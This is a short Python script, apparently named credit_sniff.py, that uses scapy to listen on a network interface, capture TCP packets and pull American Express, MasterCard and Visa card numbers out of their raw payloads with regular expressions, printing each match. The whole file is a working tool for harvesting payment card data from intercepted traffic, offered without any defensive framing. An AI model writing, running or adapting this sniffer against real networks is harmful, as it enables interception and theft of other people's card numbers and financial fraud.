import re
import argparse
from scapy.all import sniff, conf


def find_credit_card(pkt):
    raw = pkt.sprintf('%Raw.load%')
    america_re = re.findall(r'3[47][0-9]{13}', raw)
    master_re = re.findall(r'5[1-5][0-9]{14}', raw)
    visa_re = re.findall(r'4[0-9]{12}(?:[0-9]{3})?', raw)

    if america_re:
        print(f'[+] Found American Express Card: {america_re[0]}')
    if master_re:
        print(f'[+] Found MasterCard Card: {master_re[0]}')
    if visa_re:
        print(f'[+] Found Visa Card: {visa_re[0]}')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        usage='python3 credit_sniff.py INTERFACE')
    parser.add_argument('iface', type=str, metavar='INTERFACE',
                        help='specify interface to listen on')
    args = parser.parse_args()
    conf.iface = args.iface

    try:
        print('[*] Starting Credit Card Sniffer.')
        sniff(filter='tcp', prn=find_credit_card, store=0)
    except KeyboardInterrupt:
        exit(0)
